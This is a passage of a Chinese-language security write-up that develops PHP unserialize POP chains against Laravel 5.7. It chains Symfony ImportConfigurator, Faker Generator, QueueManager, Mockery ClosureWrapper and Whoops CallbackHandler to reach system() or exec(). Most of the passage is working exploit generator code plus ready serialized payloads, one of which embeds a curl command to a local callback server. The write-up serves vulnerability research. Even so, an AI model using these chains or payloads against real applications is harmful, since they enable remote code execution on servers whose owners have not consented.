        }
区别就是这里是调用`addCollection`函数，所以传递给`__call`函数的第一个参数就是`addCollection`,而`$this->route
=
$route`为传入`__call`函数的第二个参数，最后构造`laravel57\vendor\fzaninotto\faker\src\Faker\Generator.php`中的`$this->formatters`数组中含有`addCollection`键值指向调用的危险函数名即可，做法参照上面的exp，不再叙述。
注意`Symfony\Component\Routing\Loader\Configurator\ImportConfigurator`中的`$parent`替换成`%00`+`Symfony\Component\Routing\Loader\Configurator\ImportConfigurator`+`%00`
### exp2:
    parent = $parent;
            $this->route = 'curl http://127.0.0.1:8833/qing';
        }
        public function __destruct()
        {
            $this->parent->addCollection($this->route);
        }
    }
    }
    namespace Faker{
    class Generator
    {
        protected $providers = array();
        protected $formatters = array('addCollection'=>'system');
        public function __construct($vaildG)
        {
            $this->validG = new $vaildG();
        }
         public function getFormatter($formatter)
        {
            if (isset($this->formatters[$formatter])) {
                return $this->formatters[$formatter];
            }
            foreach ($this->providers as $provider) {
                if (method_exists($provider, $formatter)) {
                    $this->formatters[$formatter] = array($provider, $formatter);
                    return $this->formatters[$formatter];
                }
            }
        }
        public function format($formatter, $arguments = array())
        {
            $args = $this->getFormatter($formatter);
            return $this->validG->format($args, $arguments);
        }
        public function __call($method, $attributes)
        {
            return $this->format($method, $attributes);
        }
    }
    class ValidGenerator
    {
        protected $validator;
        protected $maxRetries;
        protected $generator = null;
        public function __construct( $validator = null, $maxRetries = 10000)
        {
            $this->validator = $validator;
            $this->maxRetries = $maxRetries;
        }
        public function format($formatter, $arguments = array())
        {
            return call_user_func_array($formatter, $arguments);
        }
    }
    }
    namespace {
    error_reporting(E_ALL);
    $test = new Symfony\Component\Routing\Loader\Configurator\ImportConfigurator(new Faker\Generator("Faker\ValidGenerator"));
    echo serialize($test);}
    O:64:"Symfony\Component\Routing\Loader\Configurator\ImportConfigurator":2:{s:72:"%00Symfony\Component\Routing\Loader\Configurator\ImportConfigurator%00parent";O:15:"Faker\Generator":3:{s:12:"%00*%00providers";a:0:{}s:13:"%00*%00formatters";a:1:{s:13:"addCollection";s:6:"system";}s:6:"validG";O:20:"Faker\ValidGenerator":3:{s:12:"%00*%00validator";N;s:13:"%00*%00maxRetries";i:10000;s:12:"%00*%00generator";N;}}s:5:"route";s:31:"curl http://127.0.0.1:8833/qing";}
* * *
## 原生POP链挖掘
回到前面传入`addCollection`参数调用`__call`这步:
搜索发现`\laravel57\vendor\laravel\framework\src\Illuminate\Database\DatabaseManager.php`的call，没发现什么特别但是调用了自己的`connection`
    public function connection($name = null)
        {
            $name = $name ?: $this->getDefaultDriver(); 
            // If the connection has not been resolved yet we will resolve it now as all
            // of the connections are resolved when they are actually needed so we do
            // not make any unnecessary connection to the various queue end-points.
            if (! isset($this->connections[$name])) {
                $this->connections[$name] = $this->resolve($name);
                $this->connections[$name]->setContainer($this->app);
            }
            return $this->connections[$name];
        }
继续瞅瞅`getDefaultDriver`、`resolve`、`setContainer`这几个方法，发现一处`call_user_func`:
    protected function resolve($name)
        {
            $config = $this->getConfig($name); 
            return $this->getConnector($config['driver'])  
                            ->connect($config)
                            ->setConnectionName($name);
        }
    //跟进getConnector：
        protected function getConnector($driver)
        {
            if (! isset($this->connectors[$driver])) {
                throw new InvalidArgumentException("No connector for [$driver]");
            }
            return call_user_func($this->connectors[$driver]);
        }
在跟到`getConnector`方法的时候发现其中的`call_user_func`函数的参数由`$this->connectors[$driver]`控制，而这个我们是可以构造来控制的，固可以利用这处来RCE.
构造的时候可以把`$this->connectors[$driver]`分两个部分构造，一个构造$driver部分，一个构造`$this->connectors`部分
#### 先看`$driver`:
可以看到`$this->connectors[$driver]`其中的`$driver`是在`resolve`函数中`return
$this->getConnector($config['driver'])`传递的，所以要去找$config，而`$config`为`$config =
$this->getConfig($name);`得到：
    protected function getConfig($name)
        {
            if (! is_null($name) && $name !== 'null') {
                return $this->app['config']["queue.connections.{$name}"];
            }
            return ['driver' => 'null'];
        }
这里可以看到函数返回值`$this->app['config']["queue.connections.{$name}"];`赋值给`$config`,取的是app属性(
**三维** 数组)中`config`对应的数组下键值‘queue.connections.{$name}’对应的数组。`app`而又在构造函数赋值：
    class QueueManager implements FactoryContract, MonitorContract
    {
        ...
    public function __construct($app)
        {
            $this->app = $app;
        }
所以编写exp中让app三维数组中`config`指向的数组其中存在‘connections.{$name}’键值指向的数组中含有driver键值即可
    class QueueManager
        {
            protected $app;
            protected $connectors;
            public function __construct($func, $param) {
                $this->app = [
                    'config'=>[
                        'queue.connections.qing'=>[
                            'driver'=>'qing'
                        ],
                    ]
                ];
            }
        }
#### 再来看`$this->connectors`:
因为最后指向`call_user_func($this->connectors[$driver]);`的地方是在`$this->connectors`数组中取出来的值来指向，比如上面的$driver变量定义的字符串是`qing`，那这里定义connectors数组中增加一个这样的键值即可:
    class QueueManager
        {
            public function __construct($func, $param) {
                $this->app = [
                    'config'=>[
                        'queue.connections.qing'=>[
                            'driver'=>'qing'
                        ],
                    ]
                ];
                $this->connectors = [
                    'qing'=>[
                        xxx
                    ]
                ];
            }
        }
`call_user_func($this->connectors[$driver]);`这里都可以控制了，固到这一步现在可以调用任意函数或者任意类的任意函数了，傻瓜式找一个类有危险函数的：
`\laravel57\vendor\mockery\mockery\library\Mockery\ClosureWrapper.php`
这里传入closure参数为执行的函数，`func_get_args()`为执行函数传入的参数 ,调用这个类的`__invoke`即可
### 编写exp：
    closure = $closure;
        }
        public function __invoke()
        {
            return call_user_func_array($this->closure, func_get_args());
        }
    }
    }
    namespace Illuminate\Queue {
        class QueueManager
        {
            protected $app;
            protected $connectors;
            public function __construct($a, $b) {
                $this->app = [
                    'config'=>[
                        'queue.default'=>'qing',
                        'queue.connections.qing'=>[
                            'driver'=>'qing'
                        ],
                    ]
                ];
                $obj = new \Mockery\ClosureWrapper("phpinfo");
                $this->connectors = [
                    'qing'=>[
                        $obj, "__invoke"
                    ]
                ];
            }
        }
    }
    namespace Symfony\Component\Routing\Loader\Configurator {
        class ImportConfigurator
        {
            private $parent;
            private $route;
            public function __construct($a,$b)
            {
                $this->parent = new \Illuminate\Queue\QueueManager($a);
                $this->route = null;
            }
        }
    }
    namespace {
    error_reporting(E_ALL);
    $test = new \Symfony\Component\Routing\Loader\Configurator\ImportConfigurator("qing","qing");
    echo serialize($test);}
    O:64:"Symfony\Component\Routing\Loader\Configurator\ImportConfigurator":2:{s:72:"%00Symfony\Component\Routing\Loader\Configurator\ImportConfigurator%00parent";O:29:"Illuminate\Queue\QueueManager":2:{s:6:"%00*%00app";a:1:{s:6:"config";a:2:{s:13:"queue.default";s:4:"qing";s:22:"queue.connections.qing";a:1:{s:6:"driver";s:4:"qing";}}}s:13:"%00*%00connectors";a:1:{s:4:"qing";a:2:{i:0;O:22:"Mockery\ClosureWrapper":1:{s:31:"%00Mockery\ClosureWrapper%00closure";s:7:"phpinfo";}i:1;s:8:"__invoke";}}}s:71:"%00Symfony\Component\Routing\Loader\Configurator\ImportConfigurator%00route";N;}
发现phpinfo一闪而过，但这里没办法传入执行函数的参数。
如果有师傅这里能执行任意参数的函数麻烦带带
这里因为有__invoke，我本想着把传入类似实例化对象当作函数执行的地址来传入参数发现都是没地址返回，折折腾腾半天这条路子就放弃了，如果要执行有参函数，目前用Mockery类无法完成，只有寻找其他类
`\laravel57\vendor\filp\whoops\src\Whoops\Handler\CallbackHandler.php`：
    public function __construct($callable)
        {
            if (!is_callable($callable)) {
                throw new InvalidArgumentException(
                    'Argument to ' . __METHOD__ . ' must be valid callable'
                );
            }
            $this->callable = $callable;
        }
        /**
         * @return int|null
         */
        public function handle()
        {
            $exception = $this->getException();
            $inspector = $this->getInspector();
            $run       = $this->getRun();
            $callable  = $this->callable;
            // invoke the callable directly, to get simpler stacktraces (in comparison to call_user_func).
            // this assumes that $callable is a properly typed php-callable, which we check in __construct().
            return $callable($exception, $inspector, $run);
        }
翻到`CallbackHandler`这个类时候发现完全符合条件，并且在包中原本的作用就是拿来回调的，固执行有参数的pop链接最后可以拿这个收尾
这里回调的地方：
    public function handle()
        {
            $exception = $this->getException();
            $inspector = $this->getInspector();
            $run       = $this->getRun();
            $callable  = $this->callable;
            // invoke the callable directly, to get simpler stacktraces (in comparison to call_user_func).
            // this assumes that $callable is a properly typed php-callable, which we check in __construct().
            return $callable($exception, $inspector, $run);
        }
发现函数名我们可以通过构造函数传入，函数的第一个参数我们也可控，不过函数的第二个参数和第三个参数默认是给null，找了一下符合要求的执行函数:
## 综上，exp3:
    callable = $callable;
        }
    }
    }
    namespace Illuminate\Queue {
        class QueueManager
        {
            protected $app;
            protected $connectors;
            public function __construct($a) {
                $this->app = [
                    'config'=>[
                        'queue.default'=>'qing',
                        'queue.connections.qing'=>[
                            'driver'=>'qing'
                        ],
                    ]
                ];
                $obj = new \Whoops\Handler\CallbackHandler($a);
            //  $obj2 = $obj("curl http://127.0.0.1:8833/qing");
                $this->connectors = [
                    'qing'=>[
                        $obj,'handle'
                    ]
                ];
            }
        }
    }
    namespace Symfony\Component\Routing\Loader\Configurator {
        class ImportConfigurator
        {
            private $parent;
            private $route;
            public function __construct($a, $b)
            {
                $this->parent = new \Illuminate\Queue\QueueManager($a);
                $this->route = null;
            }
        }
    }
    namespace {
    error_reporting(E_ALL);
    $test = new \Symfony\Component\Routing\Loader\Configurator\ImportConfigurator("exec","qing");
    echo serialize($test);}
### END
### Links：